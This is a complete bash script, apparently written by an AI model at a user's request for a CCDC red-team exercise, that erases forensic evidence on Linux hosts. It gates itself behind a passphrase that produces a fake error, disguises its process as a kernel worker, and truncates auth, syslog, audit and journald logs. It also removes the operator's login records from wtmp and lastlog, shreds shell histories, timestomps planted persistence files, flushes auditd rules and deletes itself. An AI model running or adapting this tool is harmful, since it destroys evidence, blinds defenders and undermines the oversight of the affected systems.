#!/usr/bin/env bash
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Linux Anti-Forensics Script — VanishingAct
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude Sonnet 4.6
# "read the MD files in the script planning folder. I want to get to work on
# that anti forensics file. Lets begin with the linux anti forensics one"
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# MITRE ATT&CK:
#   T1070.002 — Clear Linux/Mac System Logs (log truncation, wtmp scrub)
#   T1070.003 — Clear Command History
#   T1070.004 — File Deletion (secure wipe of staging dirs)
#   T1070.006 — Timestomp (all Phase 2 artifact files)
#   T1562.001 — Disable or Modify Security Tools (auditd rule flush)
#   T1036.005 — Masquerade as Legitimate Name/Location (kworker process name)
#   T1027.005 — Indicator Removal from Tools (self-wipe)
#   T1480     — Execution Guardrails (passphrase gate)
#
# OS:         Linux (Ubuntu, Fedora, Oracle Linux 9)
# Run as:     root
# Run order:  LAST — after all Phase 2 setup scripts have deployed
#
# WHAT THIS SCRIPT DOES:
#   Single-command evidence eraser. Wipes forensic trails without touching
#   scored services or removing Phase 2 persistence (payloads stay active).
#
#   Phase A — Passphrase Gate     : wrong key → fake bash interpreter error
#   Phase B — Process Masquerade  : re-execs self as [kworker/u4:1] in ps
#   Phase C — Log Truncation      : truncates auth/syslog/audit logs in-place
#   Phase D — Surgical Wtmp Scrub : removes only operator entries; last/who look normal
#   Phase E — Shell History Wipe  : shreds .bash_history and all tool histories
#   Phase F — Timestomping        : copies mtime from legitimate neighbors onto all
#                                   Phase 2 artifact files (KernelSneak, BootStrap,
#                                   PTraced, ChefMischief, KnockKnock)
#   Phase G — Auditd Rule Flush   : auditctl -D; service stays running
#   Phase H — Staging Dir Delete  : shreds and removes /tmp/rt_* and staging paths
#   Phase I — Self-Destruction    : shreds and deletes this script file
#
# USAGE: ./CCDC_Linux_AntiForensics_VanishingAct.sh <passphrase> [--verbose]
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }

# ── Configuration — set these before deploying ────────────────────────────────
PASSPHRASE="changeme"       # operator changes before deploy
OPERATOR_USER="redteam"     # username planted during exercise; scrubbed from wtmp
OPERATOR_IP="172.31.40.6"   # attacker IP; scrubbed from wtmp host field
VERBOSE=0

# ── Phase A — Execution Guardrail (T1480) ─────────────────────────────────────
# Passphrase check runs FIRST — before root check — so anyone who finds the
# script without the passphrase sees a fake bash interpreter error, not a
# real error message that confirms the file is a red team tool.
if [[ "${1:-}" != "$PASSPHRASE" ]]; then
    echo "bash: $0: /bin/bash: bad interpreter: No such file or directory" >&2
    exit 1
fi
shift   # remove passphrase from positional args

# ── Privilege check ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo $0)."
    exit 1
fi

for _va_arg in "$@"; do
    [[ "$_va_arg" == "--verbose" ]] && VERBOSE=1
done

# ── Phase B — Process Masquerade (T1036.005) ──────────────────────────────────
# Re-exec the script with a kernel-thread process name so ps/top show
# [kworker/u4:1] instead of the real script name during the run.
# _DISGUISED env var prevents infinite re-exec loop.
if [[ "${_DISGUISED:-0}" != "1" ]]; then
    export _DISGUISED=1
    exec -a "[kworker/u4:1]" bash "$BASH_SOURCE" "$PASSPHRASE" "$@"
fi

# ── Verbose helper ────────────────────────────────────────────────────────────
vlog() { [[ $VERBOSE -eq 1 ]] && info "$*" || true; }

# ── Distro detection ──────────────────────────────────────────────────────────
DISTRO="unknown"
detect_distro() {
    [[ ! -f /etc/os-release ]] && { err "/etc/os-release not found."; exit 1; }
    # shellcheck source=/dev/null
    source /etc/os-release
    case "${ID:-}" in
        ubuntu|debian)  DISTRO="ubuntu" ;;
        fedora)         DISTRO="fedora" ;;
        ol|rhel|centos) DISTRO="rhel"   ;;
        *) err "Unsupported distro '${ID:-unknown}'. Supported: Ubuntu, Fedora, Oracle Linux 9."; exit 1 ;;
    esac
    vlog "Distro: ${DISTRO}"
}
detect_distro

# ── Helper: truncate a log in-place ──────────────────────────────────────────
# Uses truncate -s 0 (not rm) so the file descriptor stays open for the
# logging daemon — rsyslog/journald keep writing without a restart.
truncate_log() {
    local f="$1"
    [[ -f "$f" ]] || return 0
    truncate -s 0 "$f" 2>/dev/null || true
    vlog "Truncated: $f"
}

# ── Helper: securely delete a file ────────────────────────────────────────────
# Overwrites with random data before unlinking so recovery tools get garbage.
# Falls back to dd+rm if shred is not installed.
secure_del() {
    local f="$1"
    [[ -f "$f" ]] || return 0
    if command -v shred &>/dev/null; then
        shred -zu "$f" 2>/dev/null || rm -f "$f"
    else
        local _sz
        _sz="$(stat -c%s "$f" 2>/dev/null)" || _sz=1
        dd if=/dev/urandom of="$f" bs="${_sz}" count=1 conv=notrunc 2>/dev/null || true
        rm -f "$f"
    fi
    vlog "Deleted: $f"
}

# ── Helper: stomp mtime/atime on a single file ────────────────────────────────
# Finds the nearest pre-existing neighbor in the same directory and copies its
# timestamps. Falls back to /etc/hostname (OS install age) if the dir is empty.
stomp_file() {
    local target="$1"
    [[ -e "$target" ]] || return 0
    local dir
    dir="$(dirname "$target")"
    local ref
    ref="$(find "$dir" -maxdepth 1 -not -path "$target" -type f 2>/dev/null | head -1)"
    [[ -z "$ref" ]] && ref="/etc/hostname"
    touch -r "$ref" "$target" 2>/dev/null || true
    touch -r "$ref" "$dir"    2>/dev/null || true
    vlog "Stomped: $target"
}

# ── Helper: stomp all files inside a directory ────────────────────────────────
# Uses a reference from the PARENT directory so the timestamps reflect
# legitimate system age, not exercise time.
stomp_dir() {
    local dir="$1"
    [[ -d "$dir" ]] || return 0
    local parent
    parent="$(dirname "$dir")"
    local ref
    ref="$(find "$parent" -maxdepth 1 -not -path "$dir" -type f 2>/dev/null | head -1)"
    [[ -z "$ref" ]] && ref="/etc/hostname"
    while IFS= read -r -d '' _f; do
        touch -r "$ref" "$_f" 2>/dev/null || true
        vlog "Stomped: $_f"
    done < <(find "$dir" -type f -print0 2>/dev/null)
    touch -r "$ref" "$dir" 2>/dev/null || true
    vlog "Stomped dir: $dir"
}

# ═══════════════════════════════════════════════════════════════════════════════
# Phase C — Log Truncation (T1070.002)
# ═══════════════════════════════════════════════════════════════════════════════
vlog "Phase C: Log truncation"

# Common across all distros
truncate_log /var/log/kern.log
truncate_log /var/log/daemon.log
truncate_log /var/log/mail.log
truncate_log /var/log/faillog

case "$DISTRO" in
    ubuntu)
        truncate_log /var/log/syslog
        truncate_log /var/log/auth.log
        truncate_log /var/log/apt/history.log
        truncate_log /var/log/dpkg.log
        truncate_log /var/log/cron.log
        ;;
    fedora|rhel)
        truncate_log /var/log/messages
        truncate_log /var/log/secure
        truncate_log /var/log/dnf.log
        truncate_log /var/log/yum.log
        truncate_log /var/log/cron
        ;;
esac

# Auditd logs (RHEL/Fedora/Oracle primary; may exist on Ubuntu too)
for _va_i in "" ".1" ".2" ".3"; do
    truncate_log "/var/log/audit/audit.log${_va_i}"
done

# Chef client log (ChefMischief leaves this behind)
truncate_log /var/log/chef/client.log

# Journald: rotate current journal then vacuum all entries
if command -v journalctl &>/dev/null; then
    journalctl --rotate                2>/dev/null || true
    journalctl --vacuum-time=1s        2>/dev/null || true
    vlog "Journald vacuumed"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# Phase D — Surgical Wtmp/Utmp Scrub (T1070.002)
# ═══════════════════════════════════════════════════════════════════════════════
# Removes only the operator's entries by username and source IP.
# last/who still show all other legitimate historical logins — a blank wtmp
# is far more suspicious than one with normal entries and no red team session.
vlog "Phase D: Surgical wtmp/utmp/lastlog scrub"

export OPERATOR_USER OPERATOR_IP

python3 - <<'PYEOF' || true
import struct, os, pwd

# Linux utmp record (glibc, x86_64):
#   ut_type(h/2) pad(2x) ut_pid(i/4) ut_line(32s) ut_id(4s)
#   ut_user(32s) ut_host(256s) e_term(h/2) e_exit(h/2)
#   ut_session(i/4) tv_sec(i/4) tv_usec(i/4) addr_v6(4i/16) reserved(20s)
UTMP_FMT  = '=h2xi32s4s32s256shhiii4i20s'
UTMP_SIZE = struct.calcsize(UTMP_FMT)   # 384 bytes

OP_USER = os.environ.get('OPERATOR_USER', '').encode()
OP_IP   = os.environ.get('OPERATOR_IP', '').encode()

def scrub_utmp(path):
    if not os.path.exists(path):
        return
    try:
        with open(path, 'rb') as fh:
            data = fh.read()
    except Exception:
        return
    kept = []
    for off in range(0, len(data), UTMP_SIZE):
        chunk = data[off:off + UTMP_SIZE]
        if len(chunk) < UTMP_SIZE:
            break
        fields = struct.unpack(UTMP_FMT, chunk)
        ut_user = fields[4].rstrip(b'\x00')
        ut_host = fields[5].rstrip(b'\x00')
        if (OP_USER and ut_user == OP_USER) or (OP_IP and ut_host == OP_IP):
            continue    # drop operator entry
        kept.append(chunk)
    tmp = path + '.va_tmp'
    try:
        with open(tmp, 'wb') as fh:
            for r in kept:
                fh.write(r)
        os.replace(tmp, path)
    except Exception:
        if os.path.exists(tmp):
            os.remove(tmp)

def scrub_lastlog(path):
    # lastlog is indexed by UID; each slot is time_t+32+256 bytes.
    # Zero out only the operator's UID slot.
    if not os.path.exists(path) or not OP_USER:
        return
    try:
        uid = pwd.getpwnam(OP_USER.decode('utf-8', errors='replace')).pw_uid
    except KeyError:
        return
    fsize = os.path.getsize(path)
    # Detect record size: 296 on 64-bit (8-byte time_t), 292 on 32-bit (4-byte)
    rec_size = 296
    if fsize > 0 and fsize % 292 == 0 and fsize % 296 != 0:
        rec_size = 292
    offset = uid * rec_size
    if offset + rec_size > fsize:
        return
    try:
        with open(path, 'r+b') as fh:
            fh.seek(offset)
            fh.write(b'\x00' * rec_size)
    except Exception:
        pass

scrub_utmp('/var/log/wtmp')
scrub_utmp('/var/run/utmp')
scrub_lastlog('/var/log/lastlog')
PYEOF

vlog "Wtmp/utmp scrubbed"

# ═══════════════════════════════════════════════════════════════════════════════
# Phase E — Shell & Tool History Wipe (T1070.003)
# ═══════════════════════════════════════════════════════════════════════════════
vlog "Phase E: Shell history wipe"

wipe_history() {
    local home_dir="$1"
    [[ -d "$home_dir" ]] || return 0
    local -a _hist_files=(
        "${home_dir}/.bash_history"
        "${home_dir}/.zsh_history"
        "${home_dir}/.sh_history"
        "${home_dir}/.python_history"
        "${home_dir}/.mysql_history"
        "${home_dir}/.psql_history"
        "${home_dir}/.lesshst"
        "${home_dir}/.viminfo"
        "${home_dir}/.local/share/fish/fish_history"
        "${home_dir}/.config/fish/fish_history"
    )
    for _hf in "${_hist_files[@]}"; do
        secure_del "$_hf"
    done
}

wipe_history /root
for _va_hdir in /home/*/; do
    wipe_history "$_va_hdir"
done

unset HISTFILE
history -c 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════════════════
# Phase F — Timestomping (T1070.006)
# ═══════════════════════════════════════════════════════════════════════════════
# Copies mtime/atime from a legitimate pre-existing neighbor file onto every
# Phase 2 artifact so find -newer and ls -la show plausible system-age dates.
# Also stomps the parent directory mtime. Missing artifacts silently skipped.
vlog "Phase F: Timestomping Phase 2 artifacts"

_KVER="$(uname -r)"

# ── KernelSneak (T1014) ───────────────────────────────────────────────────────
stomp_file "/etc/modules-load.d/acpi-button-helper.conf"
stomp_file "/etc/acpi-button-helper.installed"
stomp_file "/lib/modules/${_KVER}/kernel/drivers/acpi/acpi_button_helper.ko"

# ── BootStrap (T1542.001) ─────────────────────────────────────────────────────
stomp_dir  "/usr/lib/.sysrecovery"
stomp_file "/etc/cron.d/apt-daily-extras"
stomp_file "/etc/systemd/system/sysrecovery-init.service"
stomp_file "/etc/systemd/system/multi-user.target.wants/sysrecovery-init.service"
case "$DISTRO" in
    ubuntu)
        stomp_file "/etc/initramfs-tools/scripts/init-bottom/99-sysrecovery"
        stomp_file "/etc/initramfs-tools/hooks/sysrecovery-chattr"
        ;;
    fedora|rhel)
        stomp_dir  "/usr/lib/dracut/modules.d/99sysrecovery"
        ;;
esac

# ── PTraced (T1055.008) ───────────────────────────────────────────────────────
stomp_file "/tmp/.ptrace_inject"
stomp_file "/etc/cron.d/systemd-coredump-helper"

# ── ChefMischief (T1072) ──────────────────────────────────────────────────────
stomp_dir  "/var/chef/cookbooks/base_config"
stomp_file "/etc/chef/client.rb"
stomp_file "/etc/systemd/system/chef-maint.service"
stomp_file "/etc/systemd/system/chef-maint.timer"

# ── KnockKnock (T1205.001) ────────────────────────────────────────────────────
stomp_file "/etc/systemd/system/ufw-compat.service"
stomp_file "/etc/cron.d/iptables-compat-restore"
stomp_file "/etc/iptables/rules.v4"

# ── SSH authorized_keys planted by BootStrap ─────────────────────────────────
stomp_file "/root/.ssh/authorized_keys"
for _va_hdir in /home/*/; do
    stomp_file "${_va_hdir}.ssh/authorized_keys"
done

# ═══════════════════════════════════════════════════════════════════════════════
# Phase G — Auditd Rule Flush (T1562.001)
# ═══════════════════════════════════════════════════════════════════════════════
# Flushes all active auditd rules so nothing new about red team activity gets
# recorded. Does NOT stop or disable auditd — service stays running and appears
# healthy; it just has no rules to match anything.
vlog "Phase G: Auditd rule flush"
if command -v auditctl &>/dev/null; then
    auditctl -D 2>/dev/null || true
    vlog "Auditd rules flushed"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# Phase H — Secure Staging Dir Deletion (T1070.004)
# ═══════════════════════════════════════════════════════════════════════════════
vlog "Phase H: Secure staging dir deletion"

# Iterate red team staging dirs and shred their contents
for _va_pat in /tmp/rt_* /run/.rt; do
    [[ -e "$_va_pat" ]] || continue
    if [[ -d "$_va_pat" ]]; then
        while IFS= read -r -d '' _va_f; do
            secure_del "$_va_f"
        done < <(find "$_va_pat" -type f -print0 2>/dev/null)
        rmdir --ignore-fail-on-non-empty "$_va_pat" 2>/dev/null || true
    else
        secure_del "$_va_pat"
    fi
done

# /dev/shm files with red team naming convention
for _va_f in /dev/shm/rt_* /dev/shm/.rt_*; do
    [[ -f "$_va_f" ]] && secure_del "$_va_f" || true
done

# Compiled helper binaries left in /tmp
secure_del "/tmp/.ptrace_inject"

# ═══════════════════════════════════════════════════════════════════════════════
# Phase I — Self-Destruction (T1027.005)
# ═══════════════════════════════════════════════════════════════════════════════
unset HISTFILE
history -c 2>/dev/null || true
[[ -n "${BASH_SOURCE[0]:-}" ]] && secure_del "${BASH_SOURCE[0]}"
